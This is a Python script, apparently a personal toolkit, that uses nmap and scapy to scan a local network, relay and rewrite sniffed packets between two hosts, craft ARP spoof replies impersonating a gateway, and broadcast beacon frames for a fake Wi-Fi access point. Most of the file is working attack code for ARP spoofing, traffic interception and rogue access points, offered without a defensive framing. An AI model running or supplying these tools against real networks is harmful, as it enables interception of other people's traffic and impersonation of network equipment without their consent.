import nmap, sys
from scapy.all import *

# Return IP & Mac of every connected device (Root might be useful be not necessary)
def nmap_scan(target_ip= '192.168.0.0/24'):
    nmScan=nmap.PortScanner()
    print("scan begin")
    devices = nmScan.scan(target_ip,"1")
    print(devices)
    ips=[]
    for ip in devices["scan"]:
        ips.append(ip)

    print(ips)
    return ips

# Return IP & Mac of every connected client (Need root)
def arp_scan(target_ip = '192.168.0.0/24'):
    
    # IP Address for the destination
    # create ARP packet
    arp = ARP(pdst=target_ip)
    # create the Ether broadcast packet
    # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    # stack them
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]
    # a list of clients, we will fill this in the upcoming loop
    clients = []

    for sent, received in result:
        # for each response, append ip and mac address to `clients` list
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})

    # print clients
    print("Available devices in the network:")
    print("IP" + " "*18+"MAC")
    for client in clients:
        print("{:16}    {}".format(client['ip'], client['mac']))

    return clients


def sniffing(src, dst):
    def editPkg(pkg):
        pkg.psrc = src
        pkg.pdst = dst
        pkg.src = getmacbyip(src)
        pkg.dst = getmacbyip(dst)
        # print(pkg.show)
        pkg.show()
        sys.stdout.flush()
        send(pkg)
    


    sniff(prn=editPkg, filter="src " + src, stop_filter = lambda x: not getattr(threading.currentThread(), "do_run", True) )
    # sniff(prn=editPkg)


def craft_arp_spoof(target_ip, gateway_ip):
    return ARP(op = 2, psrc = gateway_ip, pdst = target_ip)

# Create a fake wifi router, (need monitor mode on netif)
def fake_wifi_router(interface, name):
    # interface to use to send beacon frames, must be in monitor mode
    iface = interface 
    # generate a random MAC address (built-in in scapy)
    sender_mac = RandMAC()
    # SSID (name of access point)
    ssid = name
    # 802.11 frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
    # beacon layer
    beacon = Dot11Beacon()
    # putting ssid in the frame
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    # stack all the layers and add a RadioTap
    frame = RadioTap()/dot11/beacon/essid
    # send the frame in layer 2 every 100 milliseconds forever
    # using the `iface` interface
    sendp(frame, inter=0.1, iface=iface, loop=1)


if __name__=='__main__':
    # arp_scan('192.168.2.0/24')
    arp_scan()
    # sniffing("1.1.1.1", "0.0.0.0")